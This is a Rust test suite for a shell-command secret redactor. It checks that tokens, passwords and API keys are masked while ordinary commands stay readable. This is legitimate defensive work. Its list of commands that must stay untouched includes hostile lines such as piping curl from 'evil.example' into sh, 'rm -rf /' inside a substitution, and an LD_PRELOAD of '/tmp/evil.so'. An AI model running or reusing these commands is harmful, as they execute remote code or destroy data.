#![allow(clippy::unwrap_used)]

use super::words::{Rules, secret_ranges};
use super::*;

/// Every case holds a secret; `leak` is the part that must not survive.
const SECRETS: &[(&str, &str)] = &[
    (
        concat!(
            "curl -H 'Authorization: Bearer ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8' ",
            "https://api.github.com/user"
        ),
        "ghp_A1b2",
    ),
    (
        "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
        "AKIAIOSFODNN7",
    ),
    (
        "aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "wJalrXUtnFEMI",
    ),
    (
        concat!(
            "curl https://api.openai.com/v1/models -H ",
            "'Authorization: Bearer sk-",
            "proj-abcdEFGHijklMNOPqrstUVWXyz0123456789abcdEFGH'"
        ),
        "sk-proj-abcd",
    ),
    (
        concat!(
            "git push https://oauth2:glp",
            "at-xxxxYYYYzzzz1111AAAA@gitlab.com/o/r.git"
        ),
        "glpat-xxxx",
    ),
    (
        "psql postgres://admin:S3cr3tP4ss@db.internal:5432/app",
        "S3cr3tP4ss",
    ),
    (
        concat!(
            "stripe charges list --api-key sk_",
            "live_51H8abcdefghijklmnopqrstuvwxyzABCDEFGH"
        ),
        "sk_live_51H8",
    ),
    (
        concat!(
            "slack-cli post --token xo",
            "xb-1234567890-1234567890123-abcdefghijklmnopqrstuvwx"
        ),
        "xoxb-1234",
    ),
    ("somecli --password hunter2 login", "hunter2"),
    (
        "MY_TOKEN=9f8e7d6c5b4a39281706f5e4d3c2b1a0 ./deploy.sh",
        "9f8e7d6c",
    ),
    ("curl -u admin:hunter2 https://x.example", "hunter2"),
    ("mysql -phunter2 app", "hunter2"),
    ("sudo curl -u admin:hunter2 https://x.example", "hunter2"),
    ("ls; curl -u admin:hunter2 https://x.example", "hunter2"),
    // Review of the first version: shapes it missed.
    (
        "docker login -u me -p s3cr3t-pw registry.example",
        "s3cr3t-pw",
    ),
    ("redis-cli -a s3cr3t-pw ping", "s3cr3t-pw"),
    ("az login -u me -p s3cr3t-pw", "s3cr3t-pw"),
    ("vault login s.s3cr3tvaulttoken", "s.s3cr3t"),
    ("zip -P s3cr3t-pw out.zip f", "s3cr3t-pw"),
    ("openssl rsa -passin pass:s3cr3t-pw -in k.pem", "s3cr3t-pw"),
    (
        "curl 'https://x.example/cb?client_secret=s3cr3t-pw&page=2'",
        "s3cr3t-pw",
    ),
    (
        "npm config set //registry.npmjs.org/:_authToken=s3cr3t-pw",
        "s3cr3t-pw",
    ),
    ("psql \"host=db password=s3cr3t-pw\"", "s3cr3t-pw"),
    (
        "kubectl create secret generic x --from-literal=password=s3cr3t-pw",
        "s3cr3t-pw",
    ),
    ("git config user.password s3cr3t-pw", "s3cr3t-pw"),
    (
        "curl -d '{\"password\": \"s3cr3t-pw\"}' https://x.example",
        "s3cr3t-pw",
    ),
    ("PGPASSWORD=s3cr3t-pw psql -h db", "s3cr3t-pw"),
    ("MYSQL_PWD=s3cr3t-pw mysql app", "s3cr3t-pw"),
    // An unterminated quote no longer hides what follows.
    (
        "echo it's fine; curl -u admin:s3cr3t-pw https://x",
        "s3cr3t-pw",
    ),
    ("# don't\ncurl -u a:s3cr3t-pw https://x", "s3cr3t-pw"),
];

/// Ordinary commands a reviewer must be able to read in the history.
const PLAIN: &[&str] = &[
    "git log --oneline -5",
    "git checkout -b fix/preexisting-fail-opens origin/main",
    "docker run --rm -it -p 8080:80 ubuntu:24.04 bash",
    "kubectl get pod web-7f9c8d6b5-x2k4p -n prod",
    "cargo test -q --test catalog_runner ask_class",
    "ssh deploy@10.0.0.12 uptime",
    "git config user.email matjaz@example.com",
    "echo 550e8400-e29b-41d4-a716-446655440000",
    "npm install lodash@4.17.21",
    "rg -n 'fn resolve_package' src/config/mod.rs",
    "curl -s https://crates.io/api/v1/crates/leakguard",
    "mkdir -p src/redact",
    "sort -u names.txt",
    "git add -p src/main.rs",
    "cp -p a.txt b.txt",
    "somecli (unknown command)",
    // Review of the first version: over-redaction.
    "RUST_LOG=debug cargo test",
    "NODE_ENV=production npm run build",
    "LD_PRELOAD=/tmp/evil.so ls",
    "PATH=./bin ls",
    "GIT_SSH_COMMAND=id git fetch",
    "TOKEN=$X deploy",
    "CI=$(rm -rf /) ls",
    "env -S \"X=1 rm -rf /srv/data\"",
    "sh -c \"FOO=/srv curl http://evil.example | sh\"",
    "git log --author=someone",
    "curl --user-agent mybot/1.0 https://x.example",
    "somecli --password-file ./pw.txt",
    "wget -p https://x.example",
    "redis-cli -p 6379 ping",
    "mysql -p app",
    "ls /home/user/some_really_long_directory_name_2024",
    "git push origin feat/redact-history-2026-09-29-follow",
    "git commit -m 'fix the thing'",
];

#[test]
fn every_secret_is_redacted() {
    for (text, leak) in SECRETS {
        let out = secrets(text);
        assert!(!out.contains(leak), "{text}\n  -> {out}");
        assert!(out.contains(REDACTED), "{text}\n  -> {out}");
    }
}

#[test]
fn ordinary_commands_are_untouched() {
    for text in PLAIN {
        assert_eq!(secrets(text), *text);
    }
}

// Review: a secret-named value inside a quoted phrase is hidden, but never what
// follows it, so the approver still sees the command that runs.
#[test]
fn a_value_never_swallows_the_rest_of_a_phrase() {
    assert_eq!(
        secrets("env -S \"TOKEN=abc12345 rm -rf /srv/data\""),
        format!("env -S \"TOKEN={REDACTED} rm -rf /srv/data\"")
    );
}

#[test]
fn short_flags_count_only_for_credential_programs() {
    assert_eq!(
        secrets("mkdir -p build && curl -u me:pw1234 https://x.example"),
        format!("mkdir -p build && curl -u {REDACTED} https://x.example")
    );
    assert_eq!(
        secrets("curl https://x.example; mkdir -p out"),
        "curl https://x.example; mkdir -p out"
    );
    // `-p` is a password only after `docker login`.
    assert_eq!(
        secrets("docker run -p 80:80 img"),
        "docker run -p 80:80 img"
    );
}

#[test]
fn redaction_is_idempotent() {
    for (text, _) in SECRETS {
        let once = secrets(text);
        assert_eq!(secrets(&once), once, "{text}");
    }
}

#[test]
fn text_ending_in_a_scheme_separator_does_not_panic() {
    for text in ["echo http://", "://", " Σhttps://https://https://"] {
        assert_eq!(secrets(text), text);
    }
}

#[test]
fn secret_names_are_recognised() {
    for name in [
        "GITHUB_TOKEN",
        "DB_PASSWORD",
        "AWS_SECRET_ACCESS_KEY",
        "api_key",
        "NPM_AUTH",
        "GH_PAT",
        "PGPASSWORD",
        "MYSQL_PWD",
        "MYTOKEN",
        "apiToken",
        "GITHUB_TOKENS",
        "SECRETS",
        "DATABASE_DSN",
    ] {
        assert!(is_secret_name(name), "{name}");
    }
    for name in [
        "PWD",
        "OLDPWD",
        "HOME",
        "PATH",
        "KEYBOARD_LAYOUT",
        "USER",
        "CI",
        "SSH_AUTH_SOCK",
        "SSH_KEY_PATH",
        "XDG_SESSION_ID",
        "PAT_BRANCH",
    ] {
        assert!(!is_secret_name(name), "{name}");
    }
}

#[test]
fn a_secret_named_value_is_scrubbed_whatever_its_shape() {
    let mut revealed = Revealed::default();
    revealed.record("DB_PASSWORD", "hunter2x");
    revealed.record("HOME", "/home/user");
    let out = revealed.show("redirect to hunter2x in /home/user".to_owned());
    assert_eq!(out, format!("redirect to {REDACTED} in /home/user"));
}

// Review: the resolver shell-quotes a value holding `'`.
#[test]
fn a_quoted_spelling_of_the_value_is_scrubbed_too() {
    let mut revealed = Revealed::default();
    revealed.record("GH_TOKEN", "fa'kevalue");
    let out = revealed.show("(resolved: systemctl 'fa'\\''kevalue')".to_owned());
    assert!(!out.contains("kevalue"), "{out}");
}

#[test]
fn nothing_changes_when_nothing_was_resolved() {
    let revealed = Revealed::default();
    let reason = "somecli --token abcdefgh1234 (unknown command)".to_owned();
    assert_eq!(revealed.show(reason.clone()), reason);
}

#[test]
fn short_named_values_are_not_scrubbed_by_name() {
    let mut revealed = Revealed::default();
    revealed.record("DEBUG_TOKEN", "1");
    assert_eq!(revealed.show("echo 1 2 3".to_owned()), "echo 1 2 3");
}

#[test]
fn json_hides_secret_keys_and_redacts_strings() {
    let value = serde_json::json!({
        "password": "plain",
        "nested": {
            "api_key": 12345,
            "token": ["tok-a1", "tok-b2"],
            "note": "Authorization: Bearer abc12345",
        },
        "credentials": {"user": "me-user", "pass": "pw-value"},
        "command": "ls",
    });
    let out = json(&value).to_string();
    for leak in [
        "plain", "12345", "abc12345", "tok-a1", "tok-b2", "me-user", "pw-value",
    ] {
        assert!(!out.contains(leak), "{out}");
    }
    assert!(out.contains("\"command\":\"ls\""), "{out}");
}

#[test]
fn identifiers_stay_visible_in_history_but_not_when_strict() {
    for id in [
        "5d783b6447e850ec14e5ccd810a6ab55bb2f76c0",
        "550e8400-e29b-41d4-a716-446655440000",
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    ] {
        assert_eq!(secrets(&format!("git show {id}")), format!("git show {id}"));
        assert_eq!(
            secret_ranges(id, false, Rules::STRICT),
            vec![0..id.len()],
            "{id}"
        );
    }
}

// Jev's strict rules are unchanged by the history mode.
#[test]
fn strict_rules_still_redact_short_flags_everywhere() {
    assert_eq!(secret_ranges("src", true, Rules::STRICT), vec![0..3]);
    assert!(super::words::secret_flag("-p", Rules::STRICT));
    assert!(super::words::secret_flag("--author", Rules::STRICT));
}

#[test]
fn provider_shapes_are_caught_without_context() {
    let out = secrets("somecli list AKIAIOSFODNN7EXAMPLE");
    assert_eq!(out, format!("somecli list {REDACTED}"));
}

#[test]
fn words_keep_quotes_and_escapes_together() {
    let text = r#"a 'b c' "d \" e" f\ g;h"#;
    let spans: Vec<&str> = words_of(text)
        .iter()
        .map(|w| &text[w.span.clone()])
        .collect();
    assert_eq!(spans, ["a", "'b c'", r#""d \" e""#, r"f\ g", "h"]);
}

#[test]
fn an_open_quote_is_read_as_a_literal() {
    let text = "a b 'c d";
    let spans: Vec<&str> = words_of(text)
        .iter()
        .map(|w| &text[w.span.clone()])
        .collect();
    assert_eq!(spans, ["a", "b", "'c", "d"]);
}

#[test]
fn many_quotes_finish_quickly() {
    let text = "it's x\" y' ".repeat(20_000);
    let start = std::time::Instant::now();
    let _ = secrets(&text);
    assert!(start.elapsed().as_secs() < 5, "{:?}", start.elapsed());
}

#[test]
fn non_ascii_text_is_split_on_character_boundaries() {
    let text = "echo žabe — --password geslo€ ok";
    assert_eq!(
        secrets(text),
        format!("echo žabe — --password {REDACTED} ok")
    );
}

#[test]
fn long_input_is_linear() {
    let text = "--token x ".repeat(100_000);
    let start = std::time::Instant::now();
    let out = secrets(&text);
    assert!(!out.contains("--token x "));
    assert!(start.elapsed().as_secs() < 5, "{:?}", start.elapsed());
}

#[test]
fn every_secret_in_one_command_is_redacted() {
    assert_eq!(
        secrets("curl -u admin:pw1234 -H 'Authorization: Bearer tok3n-abcdef' https://x.example"),
        format!("curl -u {REDACTED} -H 'Authorization: Bearer {REDACTED}' https://x.example")
    );
    assert_eq!(
        secrets("A_TOKEN=abcd1234 B_PASSWORD=efgh5678 ./run"),
        format!("A_TOKEN={REDACTED} B_PASSWORD={REDACTED} ./run")
    );
}

#[test]
fn provider_shapes_the_word_rules_miss_are_redacted() {
    // Neither has a credential flag, a secret name or an opaque-token shape.
    for (text, leak) in [
        (
            concat!(
                "echo MTIzNDU2Nzg5MDEy",
                "MzQ1Njc4.GhIjKl.abcdefghijklmnopqrstuvwxyz0123"
            ),
            "GhIjKl",
        ),
        (
            concat!(
                "echo '-----BEGIN RSA PRIVATE ",
                "KEY-----\n",
                "MIIEowIBAAKCAQEAxyz\n-----END RSA PRIVATE KEY-----'"
            ),
            "MIIEow",
        ),
    ] {
        let out = secrets(text);
        assert!(!out.contains(leak), "{text}\n  -> {out}");
        assert!(out.contains(REDACTED), "{text}\n  -> {out}");
    }
}

#[test]
fn a_new_command_ends_a_credential_flag() {
    for text in [
        "somecli --token; ls -la",
        "somecli --token\nls -la",
        "somecli --token | cat",
    ] {
        assert_eq!(secrets(text), text);
    }
}

#[test]
fn every_separator_starts_a_new_command() {
    for text in [
        "curl x\nmkdir -p out",
        "curl x & mkdir -p out",
        "curl x | sort -u names.txt",
        "(curl x) ; mkdir -p out",
    ] {
        assert_eq!(secrets(text), text);
    }
}

#[test]
fn a_credential_program_is_recognised_by_path() {
    assert_eq!(
        secrets("/usr/bin/curl -u admin:hunter2 https://x.example"),
        format!("/usr/bin/curl -u {REDACTED} https://x.example")
    );
}

#[test]
fn a_redirect_ends_the_redacted_word() {
    assert_eq!(
        secrets("curl -u a:hunter2>out.txt"),
        format!("curl -u {REDACTED}>out.txt")
    );
}

#[test]
fn a_backslash_does_not_escape_inside_single_quotes() {
    assert_eq!(
        secrets(r"echo 'a\' --password hunter2"),
        format!(r"echo 'a\' --password {REDACTED}")
    );
}

#[test]
fn glued_short_values_count_only_for_credential_programs() {
    assert_eq!(secrets("ls -phunter2"), "ls -phunter2");
    assert_eq!(
        secrets("mysql -phunter2 app"),
        format!("mysql -p{REDACTED} app")
    );
}

// History: an opaque word is a token when it looks like a key (mixed case, or
// hex that is not a canonical id); a lower-case word is a name or a path.
#[test]
fn only_key_like_words_are_tokens_in_history() {
    for word in [
        "Zb0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "AbCdEf0123456789AbCdEf0123456789xyz",
        "9f8e7d6c5b4a39281706f5e4d3c2b1a0",
    ] {
        assert_eq!(
            secrets(&format!("git show {word}")),
            format!("git show {REDACTED}"),
            "{word}"
        );
    }
    for word in [
        "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz1",
        "550e8400-e29b-41d4-a716-44665544000g",
        "feat-redact-history-2026-09-29-follow-up",
    ] {
        assert_eq!(
            secrets(&format!("git show {word}")),
            format!("git show {word}")
        );
    }
}

#[test]
fn every_secret_name_segment_is_recognised() {
    for name in [
        "DB_PASS",
        "X_PASSWD",
        "GPG_PASSPHRASE",
        "X_APIKEY",
        "GCP_CREDENTIAL",
        "GCP_CREDENTIALS",
        "X_SESSION",
        "X_COOKIE",
        "X_KEY",
        "MY_SECRET",
    ] {
        assert!(is_secret_name(name), "{name}");
    }
}

#[test]
fn a_four_byte_value_is_scrubbed_by_name() {
    let mut revealed = Revealed::default();
    revealed.record("X_TOKEN", "abcd");
    assert_eq!(
        revealed.show("echo abcd".to_owned()),
        format!("echo {REDACTED}")
    );
    let mut revealed = Revealed::default();
    revealed.record("X_TOKEN", "abc");
    assert_eq!(revealed.show("echo abc".to_owned()), "echo abc");
}

#[test]
fn history_rules_leave_short_flags_alone_in_every_spelling() {
    assert_eq!(secrets("somecli '-p abc123' x"), "somecli '-p abc123' x");
    assert_eq!(secrets("somecli -p=abc x"), "somecli -p=abc x");
}

#[test]
fn a_resolution_is_redacted_by_context_too() {
    let mut revealed = Revealed::default();
    revealed.record("HOST", "x.example");
    assert_eq!(
        revealed.show("curl -u admin:hunter2 https://x.example".to_owned()),
        format!("curl -u {REDACTED} https://x.example")
    );
}

/// Second review round: shapes the first rework still missed or over-redacted.
const SECOND_ROUND: &[(&str, &str)] = &[
    (
        "curl -d '{\"password\":\"hunter2pass\"}' https://x",
        "curl -d '{\"password\":\"<redacted>\"}' https://x",
    ),
    (
        "echo '{\"user\":\"bob\",\"api_key\":\"hunter2pass\"}'",
        "echo '{\"user\":\"bob\",\"api_key\":\"<redacted>\"}'",
    ),
    (
        "curl 2>&1 -u admin:hunter2x https://x",
        "curl 2>&1 -u <redacted> https://x",
    ),
    (
        "vault login --password hunter2abc",
        "vault login --password <redacted>",
    ),
    (
        "sshpass -p -- hunter2abc ssh h",
        "sshpass -p -- <redacted> ssh h",
    ),
    ("curl '-u admin:hunter2x' x", "curl '-u <redacted>' x"),
    (
        "curl -H 'Authorization: Bearer' abc123def",
        "curl -H 'Authorization: Bearer' <redacted>",
    ),
    (
        "mysql \"--password\" hunter2abc",
        "mysql \"--password\" <redacted>",
    ),
    (
        "echo \"--password hunter2abc",
        "echo \"--password <redacted>",
    ),
    ("curl -u\\\n admin:pw1234 x", "curl -u\\\n <redacted> x"),
    (
        "gpg --passphrase hunter2abc -d f",
        "gpg --passphrase <redacted> -d f",
    ),
    (
        "somecli --credentials hunter2abc",
        "somecli --credentials <redacted>",
    ),
    (
        "curl --user admin:hunter2x https://x",
        "curl --user <redacted> https://x",
    ),
    (
        "curl -d \"password=hunter2pass&user=bob\" https://x",
        "curl -d \"password=<redacted>&user=bob\" https://x",
    ),
    (
        "curl -H \"Proxy-Authorization: Bearer abcdef1234\" https://x",
        "curl -H \"Proxy-Authorization: Bearer <redacted>\" https://x",
    ),
    // Prose and non-credential flags stay readable.
    (
        "git commit -m \"rotate token daily\"",
        "git commit -m \"rotate token daily\"",
    ),
    ("echo basic setup done", "echo basic setup done"),
    ("git log --user=bob", "git log --user=bob"),
];

#[test]
fn second_round_shapes() {
    for (text, want) in SECOND_ROUND {
        assert_eq!(secrets(text), *want, "{text}");
    }
}

#[test]
fn a_value_is_scrubbed_in_every_spelling_rippy_shows() {
    let mut revealed = Revealed::default();
    revealed.record("MY_TOKEN", "p\\ss\"w0rd\nXYZ12");
    // `{:?}` in a trace line escapes `\`, `"` and newlines.
    let debug = format!("handler: git -> Uncertain({:?})", "git p\\ss\"w0rd\nXYZ12");
    let out = revealed.show(debug);
    assert!(!out.contains("w0rd"), "{out}");
}

#[test]
fn a_value_re_parsed_as_shell_is_scrubbed_word_by_word() {
    let mut revealed = Revealed::default();
    revealed.record("X_TOKEN", "echo hi > /etc/hunter2secretpart");
    let out = revealed.show("redirect to /etc/hunter2secretpart".to_owned());
    assert_eq!(out, format!("redirect to {REDACTED}"));
    // Short words of the value are not scrubbed on their own.
    assert_eq!(revealed.show("echo hi".to_owned()), "echo hi");
}
